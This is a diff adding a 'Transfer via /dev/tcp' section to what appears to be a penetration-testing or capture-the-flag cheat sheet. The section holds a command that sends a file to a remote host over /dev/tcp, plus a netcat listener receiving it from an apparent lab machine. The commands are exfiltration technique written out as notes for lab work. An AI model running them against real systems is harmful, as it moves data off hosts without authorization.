@@ -516,6 +516,24 @@ Receive a file:
 sudo nc -lvnp PORT > received_file.ps1
 ```
 
+## Transfer via /dev/tcp
+
+We can transfer files with /dev/tcp \(send\):
+
+```bash
+cat aogiri-app.7z > /dev/tcp/10.10.16.7/1234
+```
+
+Download \(receive\) with nc:
+
+```bash
+❯ nc -lvnp 1234 > aogiri-app.7z
+listening on [any] 1234 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.10.101] 44864
+❯ ls
+ aogiri-app.7z
+```
+
 ## Transfer Binaries
 
 ### Transfer Binaries from Linux to Windows
